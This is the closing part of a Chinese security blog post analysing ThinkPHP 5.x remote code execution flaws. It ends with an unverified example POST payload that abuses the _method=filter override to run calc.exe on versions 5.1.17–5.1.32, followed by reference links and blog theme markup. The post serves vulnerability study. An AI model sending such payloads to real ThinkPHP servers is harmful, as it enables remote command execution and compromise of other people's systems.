+<h3 id="tp-5117-v-5132"><a class="markdownIt-Anchor" href="#tp-5117-v-5132"></a> TP 5.1.17&lt;= V&lt;= 5.1.32</h3>
+<p>理论的利用方法：（未验证过）</p>
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;
+
+c&#x3D;exec&amp;f&#x3D;calc.exe&amp;_method&#x3D;filter<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h1 id="参考链接"><a class="markdownIt-Anchor" href="#参考链接"></a> 参考链接</h1>
+<p><a target="_blank" rel="noopener" href="https://todis21.github.io/2023/07/08/ThinkPHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">https://todis21.github.io/2023/07/08/ThinkPHP-代码审计/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lingzhisec/p/15728886.html">https://www.cnblogs.com/lingzhisec/p/15728886.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3570">https://xz.aliyun.com/t/3570</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6106">https://xz.aliyun.com/t/6106</a></p>
+<p><a target="_blank" rel="noopener" href="https://y4er.com/posts/thinkphp5-rce/">https://y4er.com/posts/thinkphp5-rce/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wkzb/p/14156026.html">https://www.cnblogs.com/wkzb/p/14156026.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/iamstudy/articles/thinkphp_5_x_rce_1.html">https://www.cnblogs.com/iamstudy/articles/thinkphp_5_x_rce_1.html</a></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2023/04/Linux%E5%90%8E%E6%B8%97%E9%80%8F%E7%A0%94%E7%A9%B6--Linux%E7%89%B9%E6%80%A7%E5%88%A9%E7%94%A8%E5%92%8C%E6%9E%81%E9%99%90%E5%9C%BA%E6%99%AF%E5%A4%84%E7%90%86/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2024-08-16 10:34:00
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/ThinkPHP/" title="ThinkPHP">
+                        #ThinkPHP
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2023/07/ThinkPHP%E9%9D%9E%E9%BB%98%E8%AE%A4%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E5%90%AF"><span class="toc-text"> 0x00 启</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-thinkphp-2x-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text"> 0x01 ThinkPHP 2.x 命令执行</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-thinkphp-5x-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%85%BC%E5%AE%B9%E6%A8%A1%E5%BC%8F%E6%94%AF%E6%8C%81%E5%AE%9E%E4%BE%8B%E5%8C%96%E4%BB%BB%E6%84%8F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AF%BC%E8%87%B4rce"><span class="toc-text"> 0x02 ThinkPHP 5.x 命令执行（兼容模式支持实例化任意控制器导致RCE）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-text"> 1.影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text"> 2.漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text"> 3.漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#31%E9%81%87%E8%A7%81%E9%97%AE%E9%A2%98"><span class="toc-text"> 3.1遇见问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#32%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93"><span class="toc-text"> 3.2漏洞利用总结</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#tp-50x-version-5022"><span class="toc-text"> TP 5.0.x &lt;&#x3D;version&lt;&#x3D; 5.0.22</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tp-51x-version-5130"><span class="toc-text"> TP 5.1.x &lt;&#x3D;version&lt;&#x3D; 5.1.30</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4payload%E6%B1%87%E6%80%BB"><span class="toc-text"> 4.Payload汇总</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tp-50"><span class="toc-text"> TP 5.0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tp-51"><span class="toc-text"> TP 5.1</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-thinkphp-5x%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cmethod%E4%BB%BB%E6%84%8F%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95%E5%AF%BC%E8%87%B4rce"><span class="toc-text"> 0x03 ThinkPHP 5.x命令执行（method任意调用方法导致RCE）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-2"><span class="toc-text"> 1.影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2"><span class="toc-text"> 2.漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#21%E9%81%87%E8%A7%81%E9%97%AE%E9%A2%98%E9%9C%80%E8%A6%81%E5%BC%80%E5%90%AFdebug%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text"> 2.1遇见问题（需要开启debug的利用链）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#22%E4%B8%8D%E5%BC%80%E5%90%AFdebug%E6%83%85%E5%86%B5%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text"> 2.2不开启Debug情况下的利用链</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E7%9A%84payload%E5%8C%BA%E5%88%AB%E5%88%86%E6%9E%90"><span class="toc-text"> 3. 不同版本的Payload区别分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#tp-500version507"><span class="toc-text"> TP 5.0.0&lt;&#x3D;version&lt;&#x3D;5.0.7</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tp-508version5012"><span class="toc-text"> TP 5.0.8&lt;&#x3D;version&lt;&#x3D;5.0.12</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tp-5013version-5116"><span class="toc-text"> TP 5.0.13&lt;&#x3D;version&lt;&#x3D; 5.1.16</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tp-5117-version-5132"><span class="toc-text"> TP 5.1.17&lt;&#x3D; version &lt;&#x3D; 5.1.32</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%90%86%E8%AE%BA%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-text"> 理论中的利用方法</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4payload%E6%B1%87%E6%80%BB-2"><span class="toc-text"> 4.Payload汇总</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tp-500v507"><span class="toc-text"> TP 5.0.0&lt;&#x3D;V&lt;&#x3D;5.0.7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tp-508v5012"><span class="toc-text"> TP 5.0.8&lt;&#x3D;V&lt;&#x3D;5.0.12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tp-5013v-5116"><span class="toc-text"> TP 5.0.13&lt;&#x3D;V&lt;&#x3D; 5.1.16</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tp-5117-v-5132"><span class="toc-text"> TP 5.1.17&lt;&#x3D; V&lt;&#x3D; 5.1.32</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text"> 参考链接</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/cyxsec">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://cyxsec.github.io/">Copyright © 2024 CysSec</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + ThinkPHP%E6%A1%86%E6%9E%B6%E9%BB%98%E8%AE%A4RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90 + '&url=' + https%3A%2F%2Fcyxsec.github.io%2F2023%2F05%2FThinkPHP%25E9%25BB%2598%25E8%25AE%25A4%25E6%25BC%258F%25E6%25B4%259E%25E5%2588%2586%25E6%259E%2590%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://cyxsec.github.io/2023/05/ThinkPHP%E9%BB%98%E8%AE%A4%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
